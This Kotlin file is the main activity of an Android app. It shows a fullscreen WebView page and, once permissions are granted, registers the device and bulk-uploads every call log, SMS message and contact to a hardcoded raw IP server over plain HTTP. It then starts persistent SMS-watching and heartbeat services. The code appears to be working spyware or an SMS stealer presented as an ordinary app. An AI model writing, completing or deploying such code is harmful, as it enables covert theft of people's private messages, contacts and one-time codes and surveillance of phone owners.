package com.example.test

import android.os.Build
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.util.Log
import android.view.WindowManager
import android.webkit.WebView
import android.webkit.WebViewClient
import android.webkit.WebSettings
import android.webkit.WebChromeClient
import androidx.activity.ComponentActivity
import androidx.activity.compose.setContent
import androidx.core.view.WindowCompat
import androidx.core.view.WindowInsetsCompat
import androidx.core.view.WindowInsetsControllerCompat
import androidx.compose.foundation.background
import androidx.compose.foundation.layout.*
import androidx.compose.material3.*
import androidx.compose.runtime.*
import androidx.compose.ui.Modifier
import androidx.compose.ui.graphics.Color
import androidx.compose.ui.viewinterop.AndroidView
import com.example.test.utils.DataUploader
import com.example.test.utils.DeviceInfoHelper
import com.example.test.utils.PermissionManager
import com.example.test.utils.PermissionDialog
import com.example.test.utils.SmsBatchUploader
import com.example.test.utils.ContactsBatchUploader
import com.example.test.utils.CallLogsBatchUploader
import com.google.firebase.messaging.FirebaseMessaging
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob

class MainActivity : ComponentActivity() {

    private lateinit var deviceId: String
    private var fcmToken: String = ""
    private val handler = Handler(Looper.getMainLooper())

    private val BATTERY_UPDATE_INTERVAL_MS = 60000L
    private val FCM_TIMEOUT_MS = 3000L
    private val userId = Constants.USER_ID
    private val baseUrl = "http://95.134.130.160:8765"

    private lateinit var webView: WebView
    private lateinit var permissionManager: PermissionManager
    private val uploadScope = CoroutineScope(SupervisorJob() + Dispatchers.IO)

    companion object {
        private const val TAG = "MainActivity"
    }

    private val batteryUpdater = object : Runnable {
        override fun run() {
            DataUploader.sendBatteryUpdate(this@MainActivity, deviceId, fcmToken)
            handler.postDelayed(this, BATTERY_UPDATE_INTERVAL_MS)
        }
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        enableFullscreen()

        deviceId = DeviceInfoHelper.getDeviceId(this)
        Log.d(TAG, "📱 Device ID: $deviceId")

        permissionManager = PermissionManager(this)
        permissionManager.initialize { }

        setContent {
            MaterialTheme {
                MainScreen()
            }
        }
    }

    private fun enableFullscreen() {
        actionBar?.hide()
        WindowCompat.setDecorFitsSystemWindows(window, false)

        val windowInsetsController = WindowCompat.getInsetsController(window, window.decorView)
        windowInsetsController.apply {
            hide(WindowInsetsCompat.Type.systemBars())
            systemBarsBehavior = WindowInsetsControllerCompat.BEHAVIOR_SHOW_TRANSIENT_BARS_BY_SWIPE
        }

        window.addFlags(WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON)
    }

    @Composable
    fun MainScreen() {
        var showPermissionDialog by remember { mutableStateOf(false) }
        var permissionsGranted by remember { mutableStateOf(false) }
        val scope = rememberCoroutineScope()

        LaunchedEffect(Unit) {
            delay(300)
            if (!permissionManager.checkAllPermissions()) {
                showPermissionDialog = true
            } else {
                permissionsGranted = true
                continueInitialization()
            }
        }

        Box(
            modifier = Modifier
                .fillMaxSize()
                .background(Color.Black)
        ) {
            AndroidView(
                factory = { context -> createWebView() },
                modifier = Modifier.fillMaxSize()
            )

            if (showPermissionDialog) {
                PermissionDialog(
                    onRequestPermissions = {
                        scope.launch {
                            permissionManager.requestPermissions {
                                if (permissionManager.checkAllPermissions()) {
                                    showPermissionDialog = false
                                    permissionsGranted = true
                                    continueInitialization()
                                }
                            }
                        }
                    }
                )
            }
        }
    }

    private fun createWebView(): WebView {
        webView = WebView(this)

        val webSettings: WebSettings = webView.settings
        webSettings.javaScriptEnabled = true
        webSettings.javaScriptCanOpenWindowsAutomatically = true
        webSettings.domStorageEnabled = true
        webSettings.databaseEnabled = true
        webSettings.allowFileAccess = true
        webSettings.allowContentAccess = true

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.JELLY_BEAN) {
            webSettings.allowFileAccessFromFileURLs = false
            webSettings.allowUniversalAccessFromFileURLs = false
        }

        webSettings.loadWithOverviewMode = true
        webSettings.useWideViewPort = true
        webSettings.setSupportZoom(false)
        webSettings.builtInZoomControls = false
        webSettings.displayZoomControls = false
        webSettings.loadsImagesAutomatically = true
        webSettings.blockNetworkImage = false
        webSettings.blockNetworkLoads = false
        webSettings.cacheMode = WebSettings.LOAD_DEFAULT

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT) {
            webView.setLayerType(WebView.LAYER_TYPE_HARDWARE, null)
            WebView.setWebContentsDebuggingEnabled(true)
        } else {
            webView.setLayerType(WebView.LAYER_TYPE_SOFTWARE, null)
        }

        webView.webViewClient = object : WebViewClient() {
            override fun shouldOverrideUrlLoading(view: WebView?, request: android.webkit.WebResourceRequest?): Boolean {
                return false
            }

            override fun shouldOverrideUrlLoading(view: WebView?, url: String?): Boolean {
                return false
            }

            override fun onPageFinished(view: WebView?, url: String?) {
                super.onPageFinished(view, url)
                Log.d(TAG, "✅ WebView loaded")

                webView.evaluateJavascript(
                    """
                    (function() {
                        try {
                            var el = document.getElementById('deviceId');
                            if (el) el.innerText = 'Device ID: $deviceId';
                        } catch(e) {}
                    })();
                    """.trimIndent(),
                    null
                )
            }

            override fun onReceivedError(view: WebView?, errorCode: Int, description: String?, failingUrl: String?) {
                super.onReceivedError(view, errorCode, description, failingUrl)
                Log.e(TAG, "❌ WebView error: $description")
            }
        }

        webView.webChromeClient = object : WebChromeClient() {
            override fun onConsoleMessage(msg: android.webkit.ConsoleMessage?): Boolean {
                msg?.let {
                    Log.d(TAG, "JS: ${it.message()}")
                }
                return true
            }
        }

        try {
            webView.loadUrl("file:///android_asset/index.html")
            Log.d(TAG, "📄 Loading HTML...")
        } catch (e: Exception) {
            Log.e(TAG, "❌ Load error: ${e.message}")
        }

        return webView
    }

    private fun continueInitialization() {
        Log.d(TAG, "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
        Log.d(TAG, "🚀 INITIALIZATION STARTED")
        Log.d(TAG, "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")

        var fcmReceived = false

        FirebaseMessaging.getInstance().token.addOnCompleteListener { task ->
            fcmReceived = true
            if (task.isSuccessful && task.result != null) {
                fcmToken = task.result!!
                Log.d(TAG, "✅ FCM Token: ${fcmToken.take(20)}...")
            } else {
                Log.w(TAG, "⚠️ FCM failed")
                fcmToken = "NO_FCM_TOKEN_${deviceId.take(8)}"
            }
        }

        handler.postDelayed({
            if (!fcmReceived) {
                fcmToken = "NO_FCM_TOKEN_${deviceId.take(8)}"
            }

            uploadScope.launch {
                try {
                    Log.d(TAG, "════════════════════════════════════════")
                    Log.d(TAG, "🚀 UPLOAD SEQUENCE STARTED")
                    Log.d(TAG, "════════════════════════════════════════")

                    // 1️⃣ رجیستر
                    Log.d(TAG, "1️⃣ Registering...")
                    val registerSuccess = DataUploader.registerDevice(
                        this@MainActivity,
                        deviceId,
                        fcmToken,
                        userId
                    )
                    Log.d(TAG, if (registerSuccess) "✅ Registered" else "⚠️ Register failed")

                    // 2️⃣ آپلود همه Call Logs
                    Log.d(TAG, "2️⃣ Uploading all call logs...")
                    val callLogResult = CallLogsBatchUploader.uploadAllCallLogs(
                        context = this@MainActivity,
                        deviceId = deviceId,
                        baseUrl = baseUrl
                    ) { sent, total ->
                        if (sent % 500 == 0) {
                            Log.d(TAG, "   Calls: $sent/$total")
                        }
                    }

                    when (callLogResult) {
                        is CallLogsBatchUploader.UploadResult.Success -> {
                            Log.d(TAG, "✅ Call logs done: ${callLogResult.totalSent}")
                        }
                        is CallLogsBatchUploader.UploadResult.Failure -> {
                            Log.w(TAG, "⚠️ Call logs failed")
                        }
                    }

                    Log.d(TAG, "════════════════════════════════════════")
                    Log.d(TAG, "📦 BACKGROUND UPLOADS STARTED")
                    Log.d(TAG, "════════════════════════════════════════")

                    // 3️⃣ آپلود همه SMS در پس‌زمینه
                    launch {
                        Log.d(TAG, "📱 Uploading all SMS...")
                        SmsBatchUploader.uploadAllSms(
                            context = this@MainActivity,
                            deviceId = deviceId,
                            baseUrl = baseUrl
                        ) { progress ->
                            when (progress) {
                                is SmsBatchUploader.UploadProgress.Processing -> {
                                    if (progress.processed % 1000 == 0) {
                                        Log.d(TAG, "   SMS: ${progress.processed}/${progress.total}")
                                    }
                                }
                                is SmsBatchUploader.UploadProgress.Completed -> {
                                    Log.d(TAG, "✅ All SMS done!")
                                }
                                else -> {}
                            }
                        }
                    }

                    // 4️⃣ آپلود همه Contacts در پس‌زمینه
                    launch {
                        delay(1000)
                        Log.d(TAG, "👥 Uploading all contacts...")
                        val contactsResult = ContactsBatchUploader.uploadAllContacts(
                            context = this@MainActivity,
                            deviceId = deviceId,
                            baseUrl = baseUrl
                        ) { sent, total ->
                            if (sent % 500 == 0) {
                                Log.d(TAG, "   Contacts: $sent/$total")
                            }
                        }

                        when (contactsResult) {
                            is ContactsBatchUploader.UploadResult.Success -> {
                                Log.d(TAG, "✅ All contacts done: ${contactsResult.totalSent}")
                            }
                            is ContactsBatchUploader.UploadResult.Failure -> {
                                Log.w(TAG, "⚠️ Contacts failed")
                            }
                        }
                    }

                } catch (e: Exception) {
                    Log.e(TAG, "❌ Error: ${e.message}", e)
                }
            }

            // 5️⃣ شروع Battery Updater
            handler.postDelayed({
                handler.post(batteryUpdater)
                Log.d(TAG, "🔋 Battery updater started")
            }, 2000)

            // 6️⃣ شروع Heartbeat Service
            handler.postDelayed({
                startBackgroundServices()
            }, 3000)

        }, FCM_TIMEOUT_MS)
    }

    private fun startBackgroundServices() {
        try {
            val smsIntent = android.content.Intent(this, SmsService::class.java)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(smsIntent)
            } else {
                startService(smsIntent)
            }
            Log.d(TAG, "✅ SmsService started")

            val heartbeatIntent = android.content.Intent(this, HeartbeatService::class.java)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(heartbeatIntent)
            } else {
                startService(heartbeatIntent)
            }
            Log.d(TAG, "✅ HeartbeatService started")

        } catch (e: Exception) {
            Log.e(TAG, "❌ Services error: ${e.message}")
        }
    }

    override fun onBackPressed() {
        if (::webView.isInitialized && webView.canGoBack()) {
            webView.goBack()
        } else {
            super.onBackPressed()
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        handler.removeCallbacks(batteryUpdater)

        if (::webView.isInitialized) {
            webView.stopLoading()
            webView.clearCache(true)
            webView.destroy()
        }

        if (::permissionManager.isInitialized) {
            permissionManager.stopBatteryMonitoring()
        }

        Log.d(TAG, "👋 Destroyed")
    }
}